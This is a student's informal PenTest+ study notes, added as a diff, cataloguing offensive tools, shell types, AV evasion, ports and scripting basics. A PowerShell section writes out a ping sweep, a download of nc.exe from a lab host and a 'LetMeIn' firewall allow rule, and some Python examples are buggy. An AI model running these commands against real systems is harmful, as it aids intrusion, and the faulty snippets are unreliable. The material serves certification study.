@@ -1,0 +1,812 @@
+HACKING TOOLS -- DEFINITIONS -- AND HOW THEY WORK --
+
+~~~~~~~~~~~~ Let's get started ~~~~~~~~~~
+
+
+
+
+A list of vulnerability scanners --
+
+~~~~~~~~~~~~ 
+*Nikto - Web server scanner that looks for dangerous files, versions, etc.
+*OpenVAS
+*SQLMap - Scanner that attempts to detect SQL vulnerabilities
+*Nessus
+
+
+
+~~~~~~~~~~~~
+
+Credential testing tools
+~~~~~~~~~~~~~
+
+*Hashcat - Password recovery tool
+*Medusa - Parallel brute-force password tool
+*Hydra - Brute-force tool for remote authentication
+*Cewl - Ruby app that spiders a URLs and creates a word list that can be used by PW crackers
+*John the Ripper - password cracking tool
+*Cain and Abel - Windows-based PW recovery tool
+*Mimikatz - Windows-based attacks - works on memory, hashes, plaintext passwords
+*Patator - Multipurpose password cracking tool; works on multiple sevices (SSH, FTP, Telnet, etc.)
+*Dirbuster - Multithreaded java app that attempts break into directories on a server
+*W3AF - Web application attack and audit framework
+
+
+What is credential testing?
+
+~ Bruteforcing
+~password cracking
+
+
+
+Definitions to study for each term 
+
+Bruteforcing |~~~~~; 
+ In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing a combination correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.
+
+
+~~~~~~~~~~ 
+Password Cracking |~~~~~;
+In cryptanalysis and computer security, password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system in scrambled form
+
+
+~~~~~~~~~~~~~~
+
+
+Evasion Tools
+
+~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+What is evasion?
+
+
+Often during our penetration testing engagements, we may have to bypass antivirus applications – especially during the post exploitation phase to execute certain files on the target machines. Sometimes it is challenging to bypass certain antivirus applications, as there is no standard method/technique available to bypass all the antivirus software. Thus, we need to try out different methods to bypass them. This article walks the reader through some of the popular tools available to play with Antivirus evasion.
+
+~~~~~~~~~~~~~~~~~~
+
+As you can see this is a very important thing, so here are some of the tools we can use to do this.
+
+~~~~~~~~~
+
+
+*Rootkits are common forms of evasion tools
+
+Hyperion.
+Veil-Evasion.
+peCloak.
+File splitters and hex editors.
+
+
+
+Decompiling tools.
+
+
+
+What are decompilation tools used for?
+Reverse engineering tools that take an executable file and attempts to create the high-level source code to determine how the tool functions or operates
+
+
+
+IDA-Pro
+Hex Rays
+Lighthouse
+ClassInformer
+BinDiff by zynamix
+IDA-Function-Tagger
+ida-x86emu
+~~~~~~~~~~~~~~~~~~
+
+CFF Explorer which is a great tool that can.
+
+
+PE and HEX editors
+Resource editor
+Import editor
+Signature scanner
+Address converter
+Disassembler
+Dependency analyzer
+and more.It was originally published on https://www.apriorit.com/
+
+
+~~~~~~~~~~~~~~~
+
+Debugging tools
+
+What are debugging tools used for?
+*Can be used to break down and reverse engineering code
+*This is also used to review malware or malicious code
+
+
+
+
+Arm DTT, formerly known as Allinea DDT
+Eclipse debugger API used in a range of IDEs: Eclipse IDE (Java) Nodeclipse (JavaScript)
+Firefox JavaScript debugger
+GDB - the GNU debugger
+LLDB
+Microsoft Visual Studio Debugger
+Radare2
+TotalView
+Valgrind
+WDW, the OpenWatcom debugger
+WinDbg
+Earlier minicomputer debuggers include:
+
+Dynamic debugging technique (DDT)
+On-line Debugging Tool (ODT)
+Earlier Mainframe debuggers include (in date of release order):
+
+1974 OLIVER CICS TEST/DEBUG
+1980 SIMON BATCH TEST/DEBUG
+1985 CA/EZTEST
+1990 XPEDITER and Expediter CICS
+Current mainframe debuggers:
+
+Debug Tool for z/OS [7]
+XPEDITER and Expediter CICS
+z/XDC [8]
+
+
+
+Here are some more.
+
+OLLYDBG - Windows based. Debugs binary code; good for when source code is unavailable. Used to reverse engineer other programs.
+*Immunity debugger - Debugs code, analyzes malware, supports exploit creation, and can reverse engineer binary files; can simplify malicious code creation
+*GDB = GBU Debugger - Linux-based debugger that can debug C and C++
+*WinDBG = Windows Debugger - Used to debug kernel and user mode code, analyze crash dumps, and examine CPU registers as code is executed
+*IDA = Interactive Disassembler - Disassembler for software that generates assembly language source code from machine-executable code; supports multiple OSs
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+What are software assurance tools and what methods do they use?
+*Software Assurance tools are used to test software to ensure their quality
+*Fuzzing = Used by Software Assurance tools to feed bad/mangled input to ensure the app handles it graceully
+*SAST = Software Application Security Testing - Tools used to analyze source code/binaries for coding and conditions that introduce vulnerabilities
+*DAST =Dynamic application security testing - Detects vulnerabilities in an application in its running state
+---DAST is often used to test HTTP and HTML web applications
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+What is DAST?
+*DAST = Dynamic Application Security Testing
+*Black-box testing of an application which examines the application in its running state similar to how an attacker would view the application
+*Often used on web applications
+*Technology-independent, flexible, and used against web applications for vulnerabilities, input issues, and configuration flaws
+
+
+
+What is SAST?
+*SAST = Static Application Security Testing
+*Also known as Source Code Analysis Tools
+*White-box testing of an application's source code to detect flaws and vulnerabilities
+*SAST scanners must support the language and the platform of the code being scanned
+*Generates many false positives / findings and can have issues detecting all possible security flaws
+
+
+
+
+~~~~~~~~~~~~~
+
+
+~~~~OSINT~~~~
+
+
+
+
+What is OSINT?
+*OSINT = Open Source Intelligent - Information that is available publicly that is gathered for the use of operable intelligence
+*Used to help gather information for penetration testing via various tools/commands
+
+
+What are some OSINT tools?
+*Whois - Performs a lookup on the domain registrar to gather information on the domain, such as contact information and locations
+*Nslookup - Commands used to query a DNS server to gain information, such as IP addresses
+*FOCA = Fingerprinting Organizations with Collected Archives - Gathers information on targets from metadata, hidden server files, documents (.PDF and .doc files hosted online), and other information sources
+*Theharvester - Gathers emails, subdomains, hosts, employee names, ports, and banners from public sources, PGP key servers, and SHODAN to help determine Internet footprint early in pen-test
+*Shodan - Website that helps find specific types of devices that are connected to the Internet
+*Maltego - Open source OSINT tool that discovers data from open sources and creates graphical representations, such as real-world relationships between people, groups, sites, domains, etc.
+*Recon-NG - Python-based web reconnaissance tool; only gathers information from the internet
+*Censys - Maps devices, network, and infrastructure on the internet and monitors changes to it overtime; allows searches of devices and domains through API/website
+
+
+
+
+~~~~~~~~~~~~~~~~~
+
+
+Wifi Hacking Tools.
+
+Wifi hacking is essentially cracking the security protocols in a wireless network, granting full access for the hacker to view, store, download, or abuse the wireless network. ... With all the information aggregated from your compromised Wifi, hackers can use your information for their own personal needs.
+
+
+A list of tools to use for this
+~~~~~~~~~~~~~~~~~~~
+
+
+*Aircrack-NG - Wireless tool consisting of network detector, packet sniffer, WPA/WEP crackers, and 802.11 analysis tools that works on multiple OSs
+*Kismet - Network detection, packet sniffing, and IDS-tool for 802.11 wireless that works on
+*WiFite - Automated tool that attempts to crack multiple different wireless networks in a row
+
+
+
+~~~~~~~~~~~~~~~~~~
+
+
+
+~Web proxy. This is a super important thing if you want to get into web app  pentesting or pentesting in general These tools are used everyday and if your a hacker you probally have heard of them and if you haven't LEARN ABOUT THEM! :)
+
+
+*OWASP ZAP - Web proxy that can also conduct various web application security testing
+*Burp Suite - Web proxy that intercepts various HTTP calls and allows for analysis
+
+
+
+~~~~~~~~~
+
+
+Social engineering.
+
+What is social engineering?
+~~~~~~~~~~~~~~~~~~~~~
+In the context of information security, social engineering is the psychological manipulation of people into performing actions or divulging confidential information. This differs from social engineering within the social sciences, which does not concern the divulging of confidential information.
+
+Tools to do social engineering. 
+
+
+*SET - Social engineering toolkit that is based on attacks on the human-element in an automated fashion via creating exploit-hiding web pages, emails, send Metasploit payloads, etc.
+*BeEF - Toolkit that is based on web browsers; allows collection of zombie browsers/finds vulnerabilities in real-time.
+----BeEF can also be used to send mass emails and clone web-sites as well
+
+
+~~~~~~~~~~~~
+
+
+
+Remote access Tools.
+
+What is Remote access?
+
+
+A remote access service is any combination of hardware and software to enable the remote access tools or information that typically reside on a network of IT devices. A remote access service connects a client to a host computer, known as a remote access server. 
+
+
+~~~~~~~~~~~~~~~
+list of remote access tools.
+
+
+
+*SSH - Standard SSH software that can be used to remotely access a server
+
+*NCAT - Reads, writes, redirects, and encrypts network data;
+---Can act as a proxy and redirect traffic to other ports or hosts
+---Can act a s network gateway for command executions
+
+*NETCAT - Tool that can read or write network data via TCP or UDP and is often used as a back-end tool
+
+*ProxyChains - Unix program that forces TCP commutations made by an application to follow through proxies such as TOR or SOCKS via hooking DLLs libc functions
+
+
+~~~~~~~~~~~~~~~~~
+
+Networking
+
+
+~networking is a super important part if you wanna do anything in cybersecurity so therefore you should learn about that and know how to use networking.
+
+
+
+What are some networking tools?
+*Wireshark - Packet analyzer/capture tool that allows for sniffing and review of captured packets
+
+*Hping - Packet generator and analyzer; usually via ICMP but can do TCP/UDP
+---Can be used to test firewalls, port scan, path discovery, fingerprint, uptime guessing, etc.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Phone Hacking OR
+
+CompTIA mobile device tools
+
+
+~~~~~~~~~~~~~~~~~~~
+
+What is phone hacking?
+
+
+the action or practice of gaining unauthorized access to data stored in another person's phone, especially in order to access their voicemail.
+
+
+A list of tools used for comptia mobile device hacking/enumeration/manipulation.
+
+
+~~~~~~~~~~~~~~~
+
+*Androzer - Unknown; likely an android mobile tool
+*APKX - Extracts/decompiles code directly from an APK
+*APK studio - Reverse engineering/recompiling of android application binaries within a single interface
+
+
+~~~~~~~~~~~~~~~~
+
+
+Miscelaneous tools used for CompTIA or any of there certifications.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+*Searchsploit - Search tool that allows a user to search through the Exploit DB on any platform without a connection
+
+*Powersploit - Powershell tools used to inject into DLLs and supports post-exploitation
+
+*Responder - Poisons LLMNR (Link-Local Multicast Name Resolution), MDNS, and NBT-NS (NetBIOS Name Service) and
+---Has built in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server.
+---Responds to specific NBT-NS queries based on their name suffix
+
+*Impacket - Tool designed to give low-level programmatic access to packets
+
+*Empire - Tool designed to run powershell agents without installing powershell and is designed for post-exploit access that can use modules to setup tunnels, install keyloggers, etc. that uses encrypted communications
+
+*Metasploit framework - Penetration testing framework that uses anti-forensics and evasion tools
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+What is a web shell and how are they created?
+*A web shell is a script uploaded to a server to enable remote access/administration of the machine
+
+*Web shells are established through exploitation via XSS, SQLI, application/service vulnerabilities, and Remote File Include(RFI)/Local File Include(LFI), which will result in an upload of a script that generates the web shell on the server
+
+
+{There is more about this in my OWASP Notes and also https://owasp.org}
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+What is a Proxy connection?
+
+Definition 1:
+A proxy server provides a gateway between users and the internet. It is a server, referred to as an “intermediary” because it goes between end-users and the web pages they visit online. When a computer connects to the internet, it uses an IP address.
+~~~~~~~~
+
+
+Definition 2:
+A proxy allows for a connection to be made to an intermediary source before connection to a desired target, allowing to potentially bypass firewalls, hide the source IP, and permit connections to other targets within the network
+~~~~~~~~
+
+What people use it for and tools they use.
+
+
+*Proxying a connection can hide the source of the original IP address
+
+*Proxy tools (Nikto, SSH, Burp, etc.) can be used to analyze and capture traffic as it passes through before going to a host
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~
+Pass The Hash attack.
+
+(first we need to know what a hash is!)
+
+ So what is a hash?
+
+
+Hash function:
+A hash function is any function that can be used to map data of arbitrary size to fixed-size values. The values returned by a hash function are called hash values, hash codes, digests, or simply hashes. The values are usually used to index a fixed-size table called a hash table. 
+
+
+What is a 'pass the hash' attack?
+Attack designed to use the passwords pre-compiled hash for authentication, rather than having to crack the actual password
+
+
+~~~~~~~~~~~~~~~~~~~~~~
+
+******SHELLS********
+
+What is a 'bind shell' and how is it established?
+*Bind shells are when attacker connects to victim on the specific port
+
+*Bind shells are setup using a tool (netcat, metasploit, etc) on the target server to the attacker to connect to the target server on a specified port
+
+*Target machine opens up a communication port on the victim's machine and waits for incoming connections
+
+*Bind shell 'binds' a connection to a specified port on the victim's server
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+What is a 'reverse shell' and how is it established?
+*A reverse shell is where the victim connects to attacker on specific listening port
+
+*Reverse shells are setup with a tool (netcat, Metasploit, etc) on the target server to connect to the attacker's machine on a specified port
+
+*Reverse shell = Shell where target machine communicates back to attacking machine and the attacking machine has an open port that listens for data
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+What is the difference between a bind shell and a reverse shell?
+*Bind Shell = attaker connects to a victim on a specified port
+
+*Reverse Shell = Victim connects to attacker
+
+*Web shell = Shell created on server via malicious code for remote access
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+That is the end of terms that we need to know and tools we are gonna use.
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+PORTS***
+
+~~~~~~~~~~~~~~~~~~~
+FTP
+20 - TCP
+21 - TCP
+
+SSH
+22 - TCP
+
+Telnet
+23 - TCP
+
+SMTP
+25 - TCP
+
+DNS
+53 - TCP/UDP
+
+DHCP
+67/68 - TCP
+
+TFTP
+69 - UDP
+
+Finger
+79 - TCP
+
+HTTP
+80 - TCP
+
+Kerberos
+88 - UDP
+
+POP3
+110 - TCP
+
+SUNRPC
+111 - TCP/UDP
+
+MS RPC
+135 - TCP/UDP
+
+NB Session
+139 - TCP/UDP
+
+SNMP
+161 - UDP
+
+SNMP Trap
+162 - UDP
+
+LDAP
+389 - TCP
+
+SSL
+443 - TCP
+
+SMB Over IP
+445 - TCP/UDP
+
+MS-SQL
+1433 - TCP
+ 
+~~~~~~~~~~~~~~~~~~~~
+
+
+These are all super important ports and you should memorize them.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
+*****SCRIPTING******
+
+
+Scripting is another important part in web application pentesting and you need to be able to make scripts.
+~~~~~~~~~~
+
+This will definitions and terms.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+What is Flow Control?
+*Flow control dictates how instructions and commands are read and the order that they are executed by the system
+
+What is a 'loop' in a script?
+'Do' commands and similar commands that will repeat until an exit condition is read
+
+I/O
+Input and Output - How files are entered and displayed to user. CompTIA breaks it down into three areas:
+
+1) Terminal - Where commands are often entered into the system and processed; output is displayed to end user but can also be redirected
+2) File - Files can be used to input data, but are used to store data as well
+3) Network - Tools are often used to redirect output or write content over the network. Limitations include bandwidth on the wire or network devices.
+
+What are common script operations?
+*Operations are actions that can be taken by a script to perform a task. CompTIA defines 'string operations' and 'comparisons' as two of these operations.
+
+1) String Operations - Modifies lines of texts and performs operations based on text strings
+2) Comparisons - Takes action on a script based on comparison of two objects
+
+Error Handling in Scripts
+Uses various script functions to determine exit conditions and provides support to allow for a script to gracefully exit once it has ran
+
+Arrays
+*Arrays are used to store multiple values in a single variable
+
+*Example: Rather than having three variables of: var = car1; var = car2; var = car3
+-- an array can be used instead: var cars = ["car1", "car2", "car3" ];
+
+Encoding and Decoding
+*Encoding/decoding - Converts a given input text/script/language into another format
+
+---For example, HTML elements can be converted into string representations that the browser will display, rather than being interpreted as HTML
+
+---Encoding can be used to change the input type or language of the encoded format, and it can be decoded into an original format via the decoding process
+
+How can encoding/decoding secure and attack sites?
+*Encoding can be used to translate a user's input into a specific format, such as encoding a user's HTML into strings, to avoid malicious processing on the application.
+
+*Encoded malicious code that is not analyzed, decoded, and then executed can bypass some initial security before delivering a payload to compromise the system
+
+PowerShell Syntax
+*POSH uses a [verb-noun] convention for their cmdlets, such as Get-Process
+
+*Verbs: New-, Set-, Get-, Read-, Find-, Search-, Start-, Invoke-
+
+*Parameters - Each verb-noun cmdlet may have parameters to control the cmdlet, such as "Format-List -property name"
+
+*Objects: Output of most cmdlets are objects that can be passed to other cmdlets and further acted on
+
+Basic POSH Commands
+*Get-Children = Gets directory listening (ls, dir, gci)
+
+*Move Files: move-item and copy-item
+
+*Get-Content = Gets file contents (cat, type, gc)
+
+*Get-Location = Gets current directory (PWD)
+
+*Export to CSV = Get-Process | Export-Csv procs.csv
+
+*Get-HotFix = Displays all installed hotfixes.
+
+*Cd HKLM: \ = Changes to Windows directory
+
+*Get-Command = Lists all commands
+
+*"$_" = represents the current object on the pipeline.
+
+POSH PenTest Commands - Part 1
+*1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | SelectString ttl}
+---This is a ping sweep
+
+*(New-Object System.Net.WebClient).DownloadFile("http ://10.10.10.10/nc.exe","nc.exe")
+---Fetches a file via HTTP (wget in POSH)
+
+*Get-ItemProperty HKLM:\SOFTWARE \Microsoft\Windows\CurrentVersion\run
+---Lists all programs started autotmatically in registry
+
+*[System.Convert]::ToBase64String([System .Text.Encoding]::UTF8.GetBytes("PS FTW!"))
+---Converts ASCII to Baste64
+
+*These commands will list and modify Windows Firewall Rules
+1) Get-NetFirewallRule -all
+2) New-NetFirewallRule -Action Allow -DisplayName LetMeIn - RemoteAddress 10.10.10.25
+
+ls .txt | ForEach-Object {cat $_}
+---This is ForEach-Object in pipeline (alias%)
+
+POSH PenTest Commands - Part 2
+*Get-Process | Where-Object {$_.name -eq "notepad"}
+---This is used for to find where the object is located
+
+*1..10 - This one would paste 1 through 10 on the terminal as a range
+
+*1..10 | % {echo "Hello!"} = A loop where Hello is entered to the terminal 10 times
+
+*"$_" = represents the current object on the pipeline.
+
+*$tmol = 42
+---This sets a variable of 'tmol' with a value of '42'
+
+*Ls variable:
+---This will list all current variables on the system
+
+*dir | group extension | sort
+---This lists the directory, groups by extension, and then sorts it
+
+Quick bash examples
+$# = number of arguments
+
+$@ = what parameters were passed
+
+$? = was last command successful.
+
+Ruby - Part 1
+*irb = Interactive Ruby - Shows results of anything entered into Ruby
+
+*Entering 'def hi' would result in defining the 'hi' method
+---If the next line was: puts "hello world"
+---The last line is "end"
+---The response may be => :hi or nil, indicating that ruby has taken it
+---If 'def hi(name)' was used, then the 'hi' method would use a parameter for 'name'
+
+*Using a '#' before '{', such as "Hello #{name}!", results in passing a variable to the string
+
+*A ruby class uses multiple methods at once
+---Classes are good for storing multiple variables throughout multiple methods
+---Using "@" with a variable means that it is an instance variable and is available to all classes
+---Typically, these are used with objects to help support the class
+
+Ruby - Part 2
+*Objects are representations of real information and are stored, and multiple objects are stored within a method
+---For instance, this is a greeter object created in the greeter class: greeter = Greeter.new("Pat")
+---Something such as greeter.say_hi or greeter.say_bye will call various methods in the class
+
+*Question marks can be used at the end of a method that returns a Boolean value
+
+*@<class>.respond_to?('<method>') --- This would return true or false depending on if the class has the listed method included in the class
+
+*Aliases are often used for class types. For example, the 'Class MegaGreeter' can be changed to an alias via something such as mg = MegaGreeter.new would create a new megagreeter with an alias of 'mg'
+---Then, things such as mg.say_hi and mg.say_hi could be used, but these are megagreeter.new representing mg.say_hi
+
+Ruby - Part 3
+*Pipes Example: File.open(users_file, "r").each do |user|
+---The pipes specify arguments that are populated with values by the function that calls your block
+
+*if __FILE__ == $0
+---$0 is the name of the file being used to start the program
+---__FILE__ in general is the name of the current file
+---This indicates that the file is used as a library, and to execute the code in the file rather than the code being presented
+
+*"do" and "each" are used for looping logic
+
+*Comments are used via '#' and continue to the end of the line
+
+Ruby - Part 4
+*Pseudo Variables
+---Self - receiver of current method
+---Nil - Sole instance of Class NilClass
+---Ture/False - Only members TrueClass and FalseClass
+
+*__LINE__ - Current line in the source file
+
+*Ranges: 1..10, "a".."z"
+
+*A gem file is used to load the various ruby gems and is a small file with gem '<gem name>'
+
+*#!/usr/bin/env ruby
+---Shebang at the top of the code that indicates it is Ruby code
+
+Ruby - Part 5
+*Using the slash is regex that is not terminated
+***--> #{username}/#{password}")
+
+*Ruby code often has "require 'openssl'" or other values there, that requires modules
+
+*Class > Method > Objects > Variables
+
+Misc Python
+*Shebang = #!/usr/bin/env python
+
+*__init___ - Used to create and object and passes the first parameter via the init method
+---All additional parameters are passed as arguments
+
+*The 'file' command can be used by python to manage and manipulate files, such as the following functions: open(), read(), write(), append(), etc.
+
+*'import' can be used at the start to import various modules
+---Example: from threading import Thread
+
+*'Return' is used in flow control to output results to the calling function
+---Example: return open("README").read()
+
+*'Self' variable represents the instance of the object itself
+---When objects are instantiated, object itself is passed into the self parameter
+---For example, self could be man or female If "man = human()" and "woman = human()" are in the codebase
+
+Python - Examples #1
+*FUNCTIONS EXAMPLE - Functions in pythons are defined, such as:
+def add (Num1, num2):
+myresult = num1 + num2
+return myresulf
+---If "print add(5,5)" is entered, 10 will be displayed on screen
+
+*ENCODING
+---Encode "a string" - "a string".encode(codec name)
+---Decode "a string" - "a string".decode(codec name)
+
+PYTHON EXEUCTION
+1) COMMAND LINE: Python -c ["script string"]
+---Python -c "print 'Hello World!'"
+
+2) INTERPRER SCRIPT: cat helloworld.py python helloworld.py
+---Cat would display: print "Hello World"
+--- Generic python would render Hello World to screen
+
+3)INTERACTIVE SHELL:
+Python
+>>> print "Hello World"
+Hello World
+
+Python - Examples #2
+*Convert ASCII:
+Newstr = chr (<integer 1 to 255>)
+>>>print chr(65)
+A
+
+*Loop management
+---'break' = Exits loop immediately
+---'continue' = Skips rest of loop and do loop again
+---Example - for loop 0 thru 9 === for x in range (10):
+---Example - for items in a list === for x in alist
+
+*Lists
+---Create empty list - newlist=[]
+---Add item to list - alist.append(new item)
+---Delete item from list - alist.remove(del item)
+
+Python - FUNCTIONS EXAMPLES
+Functions in pythons are defined, such as:
+def add (Num1, num2):
+myresult = num1 + num2
+return myresulf
+
+*If "print add(5,5)" is entered, 10 will be displayed on screen
+
+Python Error Handling
+*'Try' and 'Except' can be used to catch and handle errors in python
+
+*If an error is found, a try block is executed and transferred down to the except block
+---For example, try print "Hello world" and except print "Error message!"
+
+*Specific types of error message can be used:
+---Except IOError - print('an error has occurred trying to read the file')
+---Except EOFError - print'Why did you do an EOF on me?')
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
+
+That is the complete end of my notes and probally the ones i put the most effort into, i really hope i can help you learn something with these.
+
+~~Evan.
+
+
+
+
+
